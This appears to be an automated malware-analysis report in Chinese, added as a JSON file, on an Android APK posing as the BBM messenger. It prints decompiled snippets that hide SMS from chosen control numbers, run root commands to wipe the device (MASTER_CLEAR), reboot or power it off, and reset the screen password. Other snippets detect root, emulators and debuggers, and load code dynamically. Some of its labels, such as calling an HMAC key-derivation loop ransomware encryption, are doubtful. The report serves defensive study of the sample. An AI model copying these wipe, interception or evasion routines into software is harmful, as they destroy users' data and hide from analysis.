@@ -1,0 +1,299 @@
+{
+  "APK信息": {
+    "文件名": "14aa69e661332da6bbef5adf9ce3474cf320dab38423555fd0ec9f627c907a63.apk",
+    "sha256": "14aa69e661332da6bbef5adf9ce3474cf320dab38423555fd0ec9f627c907a63",
+    "包名": "com.bbm",
+    "应用名": "BBM",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 840.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!smsMessage.Address.contains(controlNumber) || smsMessage.Address.length() - controlNumber.length() > 2) { i++; } else { if (!getAbortBroadcast()) { abortBroadcast(); } processPossibleControlMessage(smsMessage); }",
+          "malicious_code_snippet_context": "                              break;\n                          }\n                          String controlNumber = strArr[i];\n>>>                         if (!smsMessage.Address.contains(controlNumber) || smsMessage.Address.length() - controlNumber.length() > 2) {\n                              i++;\n                          } else {\n                              if (!getAbortBroadcast()) {",
+          "behavior_description": "代码遍历一组控制号码(strArr)，将收到的短信发送方地址(smsMessage.Address)与控制号码进行匹配。若匹配成功，则调用abortBroadcast()中止短信广播，使短信不会到达用户收件箱或其他应用，实现短信拦截隐藏；随后调用processPossibleControlMessage()将该短信作为控制指令进行处理。数据流向：短信广播(smsMessage)→abortBroadcast()隐藏短信 + processPossibleControlMessage()解析控制指令。这是典型的通过短信进行C2控制的恶意行为，拦截特定号码短信以隐蔽接收远程指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "if(v != 0)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "return v == 1 ? ScreenPassword.resetPassword() : Protocol.TErrorType.NOT_SUPPORTED;\nnew Timer().schedule(new TimerTask() { public void run() { RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\"); } }, 7000L);\nRootHelper.getInstance().executeRootCommand(\"input keyevent KEYCODE_POWER;input keyevent KEYCODE_POWER\");",
+          "malicious_code_snippet_context": "                  }\n              } else if (cmd == 1) {\n                  if (v != 0) {\n>>>                     return v == 1 ? ScreenPassword.resetPassword() : Protocol.TErrorType.NOT_SUPPORTED;\n>>>                 }\n>>>                 new Timer().schedule(new TimerTask() { // from class: com.system.security_update.SessionManager.4\n                      @Override // java.util.TimerTask, java.lang.Runnable\n                      public void run() {\n                          RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\");",
+          "behavior_description": "该代码通过命令参数(cmd, v)控制设备锁屏与数据擦除行为。当cmd==1且v==1时，调用ScreenPassword.resetPassword()重置设备屏幕密码实现勒索锁屏；当v==0时，通过RootHelper以root权限执行'am broadcast -a android.intent.action.MASTER_CLEAR'广播触发恢复出厂设置，7秒后擦除用户全部数据作为威胁手段。此外还通过模拟KEYCODE_POWER按键控制屏幕休眠。类路径伪装为系统安全更新(com.system.security_update)，是典型的勒索软件设备锁定与数据破坏行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\bbm\\util\\g\\b;",
+          "method_signature": "while(i3 > 0)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Mac mac = Mac.getInstance(\"HmacSHA256\");\nbyte[] bArr3 = new byte[16];\nint i3 = i;\nwhile (i3 > 0) {\n    SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"HMACSHA256\");\n    mac.init(secretKeySpec);\n    mac.update(bArr4);\n    byte[] doFinal = mac.doFinal();\n    mac.reset();\n    mac.init(secretKeySpec);\n    mac.update(doFinal);\n    mac.update(bArr2);\n    byte[] doFinal2 = mac.doFinal();\n    int length = doFinal2.length;\n    if (i3 <= length) { length = i3; }\n    System.arraycopy(doFinal2, 0, bArr3, i2, length);",
+          "malicious_code_snippet_context": "      /* JADX INFO: Access modifiers changed from: package-private */\n      public static byte[] a(byte[] bArr, byte[] bArr2, int i) throws a {\n          try {\n>>>             Mac mac = Mac.getInstance(\"HmacSHA256\");\n>>>             byte[] bArr3 = new byte[16];\n>>>             int i2 = 0;\n>>>             int i3 = i;\n>>>             byte[] bArr4 = bArr2;\n>>>             while (i3 > 0) {\n>>>                 SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"HMACSHA256\");\n>>>                 try {\n>>>                     mac.init(secretKeySpec);\n>>>                     mac.update(bArr4);\n>>>                     byte[] doFinal = mac.doFinal();\n>>>                     mac.reset();\n>>>                     mac.init(secretKeySpec);\n>>>                     mac.update(doFinal);\n>>>                     mac.update(bArr2);\n>>>                     byte[] doFinal2 = mac.doFinal();\n                      int length = doFinal2.length;\n                      if (i3 <= length) {\n                          length = i3;",
+          "behavior_description": "该代码使用HMAC-SHA256算法在循环中迭代生成密钥流（keystream），每次迭代将上一次的HMAC输出与密钥材料bArr2再次进行HMAC运算，生成新的密钥块并通过System.arraycopy拼接到输出缓冲区bArr3中。这是一种典型的密钥流生成模式，用于对用户文件进行流式加密（勒索软件加密文件的核心步骤）。数据来源为密钥材料(bArr/bArr2)→危险操作为生成密钥流并用于文件加密。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "/system/xbin/su",
+          "superuser",
+          "busybox"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lb\\a\\a\\a\\a\\b\\l;",
+          "method_signature": "if((e2 || str == null || !str.contains(\"test-keys\")",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean f(Context context) {\n    boolean e2 = e(context);\n    String str = Build.TAGS;\n    if ((e2 || str == null || !str.contains(\"test-keys\")) && !new File(\"/system/app/Superuser.apk\").exists()) {\n        return !e2 && new File(\"/system/xbin/su\").exists();\n    }\n    return true;\n}",
+          "malicious_code_snippet_context": "          return \"sdk\".equals(Build.PRODUCT) || \"google_sdk\".equals(Build.PRODUCT) || Settings.Secure.getString(context.getContentResolver(), \"android_id\") == null;\n      }\n  \n>>>     public static boolean f(Context context) {\n>>>         boolean e2 = e(context);\n>>>         String str = Build.TAGS;\n>>>         if ((e2 || str == null || !str.contains(\"test-keys\")) && !new File(\"/system/app/Superuser.apk\").exists()) {\n>>>             return !e2 && new File(\"/system/xbin/su\").exists();\n>>>         }\n>>>         return true;\n>>>     }\n  \n      public static int g(Context context) {\n          int i = e(context) ? 1 : 0;",
+          "behavior_description": "该方法通过检查Build.TAGS是否包含'test-keys'、是否存在'/system/app/Superuser.apk'文件以及'/system/xbin/su'文件来判断设备是否已Root。同时通过检查Build.PRODUCT是否为'sdk'或'google_sdk'以及android_id是否为null来检测是否运行在模拟器中。这是恶意软件常用的环境探测手段，用于判断设备Root状态以决定是否执行需要提权的恶意操作，同时检测模拟器以逃避安全分析。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "dynamic_code_loading",
+      "中文名": "动态代码加载",
+      "MITRE": "T1407",
+      "置信度": "confirmed",
+      "证据": {
+        "方法引用": [
+          "Ldalvik/system/DexClassLoader;-><init>",
+          "Ldalvik/system/PathClassLoader;-><init>"
+        ],
+        "权限": [],
+        "字符串": [
+          "loadDex"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\b\\b;",
+          "method_signature": "while(listIterator.hasNext()",
+          "malicious_behavior": "dynamic_code_loading",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "while (listIterator.hasNext()) {\n    File next = listIterator.next();\n    String absolutePath = next.getAbsolutePath();\n    dexFileArr[previousIndex] = DexFile.loadDex(absolutePath, absolutePath + \".dex\", 0);\n}\na.a(classLoader, \"mPaths\", strArr);\na.a(classLoader, \"mFiles\", fileArr);\na.a(classLoader, \"mZips\", zipFileArr);\na.a(classLoader, \"mDexs\", dexFileArr);",
+          "malicious_code_snippet_context": "          ZipFile[] zipFileArr = new ZipFile[size];\n          DexFile[] dexFileArr = new DexFile[size];\n          ListIterator<File> listIterator = list.listIterator();\n>>>         while (listIterator.hasNext()) {\n>>>             File next = listIterator.next();\n>>>             String absolutePath = next.getAbsolutePath();\n>>>             sb.append(':').append(absolutePath);\n>>>             int previousIndex = listIterator.previousIndex();\n>>>             strArr[previousIndex] = absolutePath;\n>>>             fileArr[previousIndex] = next;\n>>>             zipFileArr[previousIndex] = new ZipFile(next);\n>>>             dexFileArr[previousIndex] = DexFile.loadDex(absolutePath, absolutePath + \".dex\", 0);\n          }\n          b2.set(classLoader, sb.toString());\n          a.a(classLoader, \"mPaths\", strArr);",
+          "behavior_description": "代码遍历外部传入的文件列表，获取每个文件的绝对路径，使用 DexFile.loadDex() 动态加载这些 DEX 文件，并通过反射修改 ClassLoader 的 mPaths、mFiles、mZips、mDexs 字段，将动态加载的代码注入到当前运行环境中，从而实现动态代码加载，可能用于逃避静态检测和执行隐藏的恶意逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_debug",
+          "中文名": "反调试",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "isDebuggerConnected"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_root",
+          "中文名": "反Root",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "busybox",
+              "superuser"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lb\\a\\a\\a\\a\\b\\l;",
+          "method_signature": "if(Debug.isDebuggerConnected()",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {\n    return i | 4;\n}",
+          "malicious_code_snippet_context": "          if (f(context)) {\n              i |= 2;\n          }\n>>>         if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {\n>>>             return i | 4;\n>>>         }\n          return i;\n      }\n  ",
+          "behavior_description": "该方法通过 Debug.isDebuggerConnected() 和 Debug.waitingForDebugger() 检测是否有调试器附加到进程，同时结合 /system/xbin/su 路径检测root权限，将检测结果以位掩码形式返回（debugger=4, root相关=1/2）。当检测到调试器时设置标志位，调用方可据此改变执行流程以规避动态分析。数据来源为 Debug.isDebuggerConnected()→返回位标志用于反分析决策",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\h\\a\\a\\a\\f;",
+          "method_signature": "if(c2.a(com.h.a.a.a.c.c.PPRiskDataIsEmulator)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (c2.a(com.h.a.a.a.c.c.PPRiskDataIsEmulator)) {\n    eVar.T = Boolean.valueOf(Build.BRAND.equalsIgnoreCase(\"generic\") || Build.PRODUCT.equals(\"sdk\") || Build.HARDWARE.equals(\"goldfish\") || Build.FINGERPRINT.startsWith(\"generic\") || Build.MANUFACTURER.equals(EnvironmentCompat.MEDIA_UNKNOWN) || Build.PRODUCT.matches(\".*_?sdk_?.*\"));\n}",
+          "malicious_code_snippet_context": "                  if (c2.a(com.h.a.a.a.c.c.PPRiskDataTimeZoneOffset)) {\n                      eVar.N = Integer.valueOf(TimeZone.getDefault().getOffset(date.getTime()));\n                  }\n>>>                 if (c2.a(com.h.a.a.a.c.c.PPRiskDataIsEmulator)) {\n>>>                     eVar.T = Boolean.valueOf(Build.BRAND.equalsIgnoreCase(\"generic\") || Build.PRODUCT.equals(\"sdk\") || Build.HARDWARE.equals(\"goldfish\") || Build.FINGERPRINT.startsWith(\"generic\") || Build.MANUFACTURER.equals(EnvironmentCompat.MEDIA_UNKNOWN) || Build.PRODUCT.matches(\".*_?sdk_?.*\"));\n>>>                 }\n                  if (c2.a(com.h.a.a.a.c.c.PPRiskDataIsRooted)) {\n                      eVar.U = Boolean.valueOf(com.h.a.a.a.a.a.a());\n                  }",
+          "behavior_description": "代码通过读取系统Build类的多个属性（BRAND、PRODUCT、HARDWARE、FINGERPRINT、MANUFACTURER）来判断当前运行环境是否为模拟器（如检查brand是否为generic、product是否为sdk、hardware是否为goldfish等典型模拟器特征），并将检测结果存储到变量eVar.T中。这是典型的反模拟器检测技术，恶意软件利用此技术逃避沙箱分析和安全检测，数据流向为：Build系统属性(source)→模拟器检测结果存储(sink)。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lb\\a\\a\\a\\a\\b\\l;",
+          "method_signature": "if((e2 || str == null || !str.contains(\"test-keys\")",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean e(Context context) {\n    return \"sdk\".equals(Build.PRODUCT) || \"google_sdk\".equals(Build.PRODUCT) || Settings.Secure.getString(context.getContentResolver(), \"android_id\") == null;\n}\npublic static boolean f(Context context) {\n    boolean e2 = e(context);\n    String str = Build.TAGS;\n    if ((e2 || str == null || !str.contains(\"test-keys\")) && !new File(\"/system/app/Superuser.apk\").exists()) {\n        return !e2 && new File(\"/system/xbin/su\").exists();\n    }\n    return true;\n}",
+          "malicious_code_snippet_context": "          return resources.getIdentifier(str, str2, packageName);\n      }\n  \n>>>     public static boolean e(Context context) {\n>>>         return \"sdk\".equals(Build.PRODUCT) || \"google_sdk\".equals(Build.PRODUCT) || Settings.Secure.getString(context.getContentResolver(), \"android_id\") == null;\n>>>     }\n>>> \n>>>     public static boolean f(Context context) {\n>>>         boolean e2 = e(context);\n>>>         String str = Build.TAGS;\n>>>         if ((e2 || str == null || !str.contains(\"test-keys\")) && !new File(\"/system/app/Superuser.apk\").exists()) {\n>>>             return !e2 && new File(\"/system/xbin/su\").exists();\n>>>         }\n>>>         return true;\n      }\n  \n      public static int g(Context context) {",
+          "behavior_description": "代码通过检查 Build.PRODUCT 是否为 sdk/google_sdk 判断是否运行在模拟器中，通过检查 Build.TAGS 是否包含 test-keys、/system/app/Superuser.apk 和 /system/xbin/su 是否存在来判断设备是否已 Root。这是恶意软件常用的反检测技术，用于在分析环境或 Root 设备上隐藏自身行为，逃避安全分析。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "run()",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "RootHelper.getInstance().executeRootCommand(\"reboot\");\nRootHelper.getInstance().executeRootCommand(\"reboot -p\");",
+          "malicious_code_snippet_context": "                      new Timer().schedule(new TimerTask() { // from class: com.system.security_update.SessionManager.1\n                          @Override // java.util.TimerTask, java.lang.Runnable\n                          public void run() {\n>>>                             RootHelper.getInstance().executeRootCommand(\"reboot\");\n>>>                         }\n                      }, 7000L);\n                  } else if (v == 1) {\n                      new Timer().schedule(new TimerTask() { // from class: com.system.security_update.SessionManager.2",
+          "behavior_description": "代码在确认设备已获取root权限后，通过Timer延迟7秒，利用RootHelper以root权限执行\"reboot\"（重启）或\"reboot -p\"（关机）命令。该类伪装为系统安全更新（com.system.security_update），结合恶意样本背景，此行为属于破坏性操作，可导致设备非预期重启或关机，影响用户正常使用，可能用于勒索场景或干扰用户/安全软件的查杀。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
